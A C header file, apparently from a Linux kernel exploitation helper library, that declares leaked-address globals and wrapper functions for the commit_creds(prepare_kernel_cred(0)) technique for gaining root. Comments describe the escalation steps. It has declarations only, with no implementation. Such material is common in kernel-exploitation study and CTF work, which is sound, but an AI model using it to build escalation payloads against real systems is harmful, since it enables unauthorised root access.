#ifndef PRIVESC_H
#define PRIVESC_H

#include <stdint.h>
#include <stddef.h>

extern uintptr_t POST_PRIVESC_JUMP_ADDR;

/* ============= 1 =============
 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 * */

 /* First leak the address of these 2 kernel APIs */
extern uintptr_t COMMIT_CREDS_ADDR;
extern uintptr_t PREPARE_KERNEL_CRED_ADDR;

/* Commit the creds 0 to become root
 * This returns a task_struct of a privileged context
 *
 * After this, we will need to provide a next jump
 *      to take control of the following move, as root
 * */ 

/* Use global variables to avoid clobbers if needed */
void _glb_privesc_kcred(void);

/* Pass arguments as a flex */
void __privesc_kcred(uintptr_t commit_creds_addr,
                    uintptr_t prepare_kernel_cred_addr,
                    uintptr_t post_privesc_jmp_addr);

/* Wrapper */
void privesc_kcred(void);


#endif  // PRIVESC_H
